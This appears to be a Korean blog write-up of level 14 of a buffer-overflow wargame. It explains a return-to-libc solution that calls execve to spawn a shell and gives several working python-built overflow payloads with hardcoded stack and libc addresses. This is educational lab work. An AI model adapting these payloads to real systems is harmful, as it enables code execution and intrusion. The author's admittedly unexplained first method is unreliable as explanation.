---
layout: post
title: "The Lord of the BOF - Level 14"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level14/1.jpg" | relative_url }}' alt='relative'>  

## 1) bugbear/new divide 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level14/2.png" | relative_url }}' alt='relative'>  

이번 문제도 RTL(Return to Library) 문제입니다.  

``` c
// giant.c
		...
		// gain address of execve
        fp = popen("/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "(%x)", &lib_addr);
        fclose(fp);

        fp = popen("/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'", "r");
        fgets(buffer, 255, fp);
        sscanf(buffer, "%x", &execve_offset);
        fclose(fp);

        execve_addr = lib_addr + (int)execve_offset;
        // end

        memcpy(&ret, &(argv[1][44]), 4);
        if(ret != execve_addr)
        {
                printf("You must use execve!\n");
                exit(0);
        }
		...
```

해당 코드 부분이 추가되었습니다.  
 
``` c
// 문자열 인자로 입력한 내용을 쉘에서 실행하여 실행 결과를 읽어와 fp에 저장
fp = popen("", "r")

// assassin 프로그램의 라이브러리 의존성을 확인하여 libc 문자를 포함하는 내용을 출력
// 다만, 해당 내용을 스페이스(' ')로 구분한 뒤, 4번째에 위치하는 값만 출력
"/usr/bin/ldd /home/giant/assassin | /bin/grep libc | /bin/awk '{print $4}'"

// fp에 저장된 값을 buffer에 입력하고, buffer에 저장된 값을 lib_addr에 저장합니다.  
fgets(buffer, 255, fp);
sscanf(buffer, "(%x)", &lib_addr);
```

위의 코드를 쉘에서 수행해보면 프로그램이 실행시 사용하는 공유 라이브러리의 메모리 상의 주소를 얻어오는 과정입니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/3.png" | relative_url }}' alt='relative'>  


``` c
// 문자열 인자로 입력한 내용을 쉘에서 실행하여 실행 결과를 읽어와 fp에 저장
fp = popen("", "r")

// libc.so.6 라이브러리에 포함된 모든 함수명 중 __execve 문자를 포함하는 내용을 출력
// 다만, 해당 내용을 스페이스(' ')로 구분한 뒤, 1번째에 위치하는 값만 출력
"/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'"

// fp에 저장된 값을 buffer에 입력하고, buffer에 저장된 값을 execve_offset에 저장합니다.  
fgets(buffer, 255, fp);
sscanf(buffer, "%x", &execve_offset);
```

위의 코드를 쉘에서 수행해보면 libc.so.6 라이브러리 내에 execve 함수의 offset을 얻어오는 과정입니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/3.png" | relative_url }}' alt='relative'>  

메모리 상의 libc.so.6 공유 라이브러리 주소에 execve 함수의 offset을 더해 execve_addr에 저장합니다.  
이 주소와 argv\[1\]\[44\]부터 4 byte 길이의 값을 비교합니다.  
즉, RET에 입력될 주소 값이 메모리 상의 execve 함수 주소여야 합니다.  

## 2) execve 함수의 실행 인자  

``` bash
// #include <unistd.h>
int execve(const char *filename, char *const argv[], char *const envp[]);
```

execve 함수는 함수 실행을 위해 3개의 실행 인자를 입력받습니다.  
execve 함수로 쉘을 실행하기 위해서는 filename에 "/bin/sh" 문자열을, argv에는 "/bin/sh" 문자열 주소와 NULL을, envp에는 NULL을 입력해야 합니다.  

앞 문제와 동일하게 buffer부터 ret을 입력하기 전까지 NOP으로 채운 뒤, ret에는 execve 함수 주소를 넣고, 함수 실행 뒤 복귀할 주소를 입력한 뒤 실행 인자 3개를 차례대로 넣어주면 됩니다.  

## 3) 스택에 입력할 실행 인자 값 구하기  

<a href="#1">1. 첫번째 방법: buffer 배열 이용</a>  
<a href="#2">2. 두번째 방법: system 함수 사용</a>  
<a href="#3">3. 세번째 방법: 환경변수 사용</a>  
<a href="#4">4. 네번째 방법: 실행 인자 사용</a>  

4가지 방법 중 4번 방법으로 level14 문제를 풀겠습니다.  

<p><a id="4"></a></p>

## 네번째 방법   

### giant 프로그램 실행시 두번째 인자로 "/bin/sh" 문자열을 입력하여 두번째 인자 주소가 저장된 주소를 execve 함수의 2번째 인자로 사용한다.  

### (1) 첫번째 인자  

앞 문제에서 "/bin/sh" 문자열의 위치를 구했습니다. (<a href="https://hsong2.github.io/lob/2021/07/04/The-Lord-of-the-BOF-Level-13.html#binsh">"/bin/sh" 문자열 위치 구하는 방법</a>)  

<img data-action="zoom" src='{{ "assets/lob/level14/5.png" | relative_url }}' alt='relative'>  
 
첫번째 인자인 "/bin/sh" 문자열의 위치는 0x400fbff9d 입니다.  

### (2) 두번째 인자  

두번째 인자인 argv에는 "/bin/sh\0"(=argv\[0\]) 문자열의 주소와 NULL(=argv\[1\])이 차례대로 저장된 주소를 입력해줘야 합니다.   

이를 위해 giant 프로그램을 시작할 때 2개의 실행 인자를 입력하는 데, 첫번째 실행 인자에는 공격 페이로드를 입력해주고 두번째 실행 인자에는 "/bin/sh" 문자열을 입력합니다.  
그 다음 argv에 giant 프로그램의 두번째 실행 인자의 주소가 저장된 주소를 입력합니다.  

### (3) 세번째 인자  

세번째 인자인 NULL을 어떻게 입력해줘야 할까요?  
접근할 수 있는 스택 주소 중 가장 아래에는 0x00000000 값이 있습니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/6.png" | relative_url }}' alt='relative'>  

NULL 값이 저장된 주소는 0xbffffffc 입니다. 

## 4) 공격 페이로드 만들기  

앞서 설명한 내용을 바탕으로 다음과 같이 공격 페이로드를 작성할 수 있습니다.  

``` bash
`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"AAAA"+"\xfc\xff\xff\xbf"'` `python -c 'print "/bin/sh"'`
```

\x48\x9d\x0a\x40는 execve의 주소이며, \xf9\xbf\x0f\x40는 "/bin/sh" 문자열의 주소입니다.  
giant 프로그램의 두번째 인자 주소가 저장된 위치를 알 수 없어 AAAA로 우선 입력합니다.  
그 다음 두번째 인자로 "/bin/sh" 문자열을 입력합니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/7.png" | relative_url }}' alt='relative'>  

0xbffffc6a 주소에 "/bin/sh" 문자열이 저장되어 있으며, 0xbffffb30에 argv\[2\]의 주소와 argv 주소가 더 이상 없음을 나타내는 NULL이 차례대로 저장되어 있습니다.  
따라서 AAAA 대신 0xbffffb30을 입력하면 됩니다.  

<hr> 

<img data-action="zoom" src='{{ "assets/lob/level14/8.png" | relative_url }}' alt='relative'>  

그런데 argc가 3이 아닌 4로 저장되어 있습니다.  
argv\[1\]의 내용을 살펴보니 '\x0a'이 입력되지 않고 공백(' ')으로 인식됩니다.  


아스키코드인 LF(new line)로 인식하는 문제를 해결하기 위해 쌍따옴표(")로 argv\[1\] 문자열을 감싸주면 됩니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/9.png" | relative_url }}' alt='relative'>  

``` bash
"`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"AAAA"+"\xfc\xff\xff\xbf"'`" `python -c 'print "/bin/sh"'`
```

\x0a를 LF로 인식하는 문제를 해결하니 argc의 값이 3 입니다.  
argv가 4일 때 구한 0xbffffb30 대신, AAAA에 0xbffffb2c(=\x2c\xfb\xff\xbf)를 입력하면 됩니다.  

``` bash
./giant "`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\x2c\xfb\xff\xbf"+"\xfc\xff\xff\xbf"'`" `python -c 'print "/bin/sh"'`
```

<img data-action="zoom" src='{{ "assets/lob/level14/10.png" | relative_url }}' alt='relative'>  

<hr>

<p><a id="1"></a></p>

## 첫번째 방법  

### buffer에 "/bin/sh" 문자열의 주소를 넣어 execve 함수의 2번째 인자로 사용한다.(?)  

<img data-action="zoom" src='{{ "assets/lob/level14/11.png" | relative_url }}' alt='relative'>  

``` bash
./giant "`python -c 'print "\xf9\xbf\x0f\x40"+"\x90"*40+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\xfc\xfa\xff\xbf"+"\xfc\xff\xff\xbf"'`"
```

``` bash
./giant "`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\xfc\xfa\xff\xbf"+"\xfc\xff\xff\xbf"'`"
```

흠,,, 0xbffffafc에서만 가능한 이유를 모르겠다...
buffer에 "/bin/sh" 주소를 안 넣어도 0xbffffafc 값을 넣어주면 bash가 실행된다.  
현재 내가 갖고 있는 지식으로는 이에 대한 이유를 모르겠음  

<p><a id="2"></a></p>

## 두번째 방법  

### execve 함수 인자에 exit를 넣어 execve 함수의 실행을 종료하고, 복귀 주소에 system 함수 주소를 입력하여 system 함수를 호출한다.  

execve 함수에 exit를 넣어 실행을 종료하고 system("/bin/sh")를 실행하는 방법입니다.  
RET 부분에 execve 함수의 주소를 넣고 복귀 주소로 system 함수의 주소를 입력합니다.  
그 다음 system 함수의 인자인 "/bin/sh" 문자열을 입력하면 됩니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/12.png" | relative_url }}' alt='relative'>  

``` bash
./giant "`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\xe0\x8a\x05\x40"+"\xe0\x91\x03\x40"+"\xf9\xbf\x0f\x40"+"\xfc\xff\xff\xbf"'`"
```

<p><a id="3"></a></p>

## 세번째 방법  

### 환경변수에 "/bin/sh" 문자열을 저장하여 해당 문자열이 저장된 환경변수의 주소를 execve 함수의 2번째 인자로 사용한다.  

<img data-action="zoom" src='{{ "assets/lob/level14/14.png" | relative_url }}' alt='relative'>  

환경변수에 "/bin/sh" 문자열을 저장한 뒤, "/bin/sh" 문자열을 저장한 환경변수의 주소를 얻어옵니다.  
해당 환경변수의 주소을 giant 프로그램의 심볼릭 링크 파일 이름으로 생성합니다.  

프로그램 파일 명은 스택의 제일 높은 주소에 저장되어 있으며 파일명의 끝에는 NULL로 채워져 있습니다.  
예시로 심볼릭 링크 파일 명과 동일한 길이의 test 프로그램으로 확인해보겠습니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/13.png" | relative_url }}' alt='relative'>  

0xbffffff7 주소에 "test\0"과 NULL이 차례대로 입력되어 있습니다.  
0xbffffff7 주소를 execve 함수의 2번째 인자로 입력하면 됩니다.  

<img data-action="zoom" src='{{ "assets/lob/level14/15.png" | relative_url }}' alt='relative'>  

``` bash
./`python -c 'print "\xc3\xfe\xff\xbf"'` "`python -c 'print "\x90"*44+"\x48\x9d\x0a\x40"+"\x90"*4+"\xf9\xbf\x0f\x40"+"\xf7\xff\xff\xbf"+"\xfc\xff\xff\xbf"'`"
```
